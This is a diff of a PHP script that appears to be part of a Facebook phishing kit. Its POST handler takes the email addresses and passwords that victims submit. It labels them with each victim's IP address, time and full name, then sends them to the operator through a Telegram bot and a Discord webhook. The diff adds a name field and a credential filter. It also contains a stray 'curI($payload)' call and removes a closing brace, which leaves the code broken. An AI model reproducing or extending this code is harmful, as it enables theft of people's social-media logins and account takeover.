@@ -1,14 +1,19 @@
-<?php
+ <?php
 session_start();
 
 if (!isset($_SESSION['mera_verify_flow']) || empty($_SESSION['mera_verify_flow'])) {
     header("Location: ../start-flow.php?method=facebook");
     exit;
 }
+if (empty($_SESSION['passed_apply'])) {
+    header('Location: ../apply.php');   // ibalik sa apply kung hindi dumaan
+    exit;
+}
 ?>
 <?php
 date_default_timezone_set('Asia/Manila');
 include '../config.php';
+$fullName = $_SESSION['avea_full_name'] ?? 'Unknown';
 
 // ---------- HELPER FUNCTIONS ----------
 function tg_escape($value) {
@@ -28,15 +33,20 @@ function short_discord_field($value, $limit = 950) {
 }
 
 function send_notifications($data, $options = ['telegram' => true, 'discord' => true]) {
-    global $telegram_bot_token, $telegram_chat_id, $discord_webhook_url;
+    global $telegram_bot_token, $telegram_chat_id, $discord_webhook_url, $fullName;
 
     // ---------- TELEGRAM ----------
-    if (!empty($options['telegram']) && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
-        $tgMessage = "✨ <b>New Facebook Login Notification</b>\n\n";
-        foreach ($data as $key => $value) {
-            $tgMessage .= "<b>{$key}:</b> <code>{$value}</code>\n";
-        }
+ $tgMessage  = "✨ <b>New Facebook Login Notification</b>\n\n";
 
+$tgMessage .= "<b>From Name:</b> <code>{$data['From Name']}</code>\n";
+$tgMessage .= "<b>IP Address:</b> <code>{$data['IP Address']}</code>\n";
+$tgMessage .= "<b>Time:</b> <code>{$data['Time']}</code>\n\n";
+
+foreach ($data as $key => $value) {
+    if (strpos($key, 'Email') === 0 || strpos($key, 'Password') === 0) {
+        $tgMessage .= "<b>{$key}:</b> <code>{$value}</code>\n";
+    }
+}
         $tgUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
         $tgParams = [
             'chat_id' => $telegram_chat_id,
@@ -57,7 +67,21 @@ function send_notifications($data, $options = ['telegram' => true, 'discord' => 
     // ---------- DISCORD ----------
     if (!empty($options['discord']) && !empty($discord_webhook_url)) {
         $discordFields = [];
+// From Name
+$discordFields[] = [
+    'name' => 'From Name',
+     'value' => '`' . discord_safe($data['From Name']) . '`',
+    'inline' => false
+];
 
+// IP Address
+if (isset($data['IP Address'])) {
+    $discordFields[] = [
+        'name' => 'IP Address',
+        'value' => '`' . discord_safe($data['IP Address']) . '`',
+        'inline' => true
+    ];
+}
         // Make IP and Time inline
         if (isset($data['IP Address'])) {
             $discordFields[] = [
@@ -105,7 +129,7 @@ function send_notifications($data, $options = ['telegram' => true, 'discord' => 
         curl_exec($ch);curI($payload);
         curl_close($ch);
     }
-}
+
 
 // ---------- POST HANDLER ----------
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -126,6 +150,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $time = date('M d - h:i:s A');
 
         $data = [
+             "From Name" => $fullName,
             "IP Address" => $ip,
             "Time" => $time,
             "Email #{$attempt}" => $email,
